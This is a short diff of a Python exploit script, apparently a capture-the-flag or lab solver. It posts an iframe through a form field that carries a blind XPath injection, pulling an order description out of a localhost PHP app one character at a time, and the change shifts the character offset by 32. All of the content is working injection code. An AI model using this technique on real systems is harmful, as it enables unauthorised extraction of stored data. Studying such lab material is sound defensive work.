@@ -44,7 +44,7 @@ rate_limiter = RateLimiter(RATE)
 def send_request(payload, position):
     """Send the POST request and return True if successful"""
     encoded = quote_plus(payload)
-    iframe = f'<iframe src="http://localhost:8000/index.php?q=123 or substring(/orders/order[7]/description,{position},1)=\'{encoded}\'" width="500" height="820"></iframe>'
+    iframe = f'<iframe src="http://localhost:8000/index.php?q=123 or substring(/orders/order[7]/description,{position+32},1)=\'{encoded}\'" width="500" height="820"></iframe>'
 
     try:
         response = session.post(URL, data={'desc': iframe}, timeout=2)
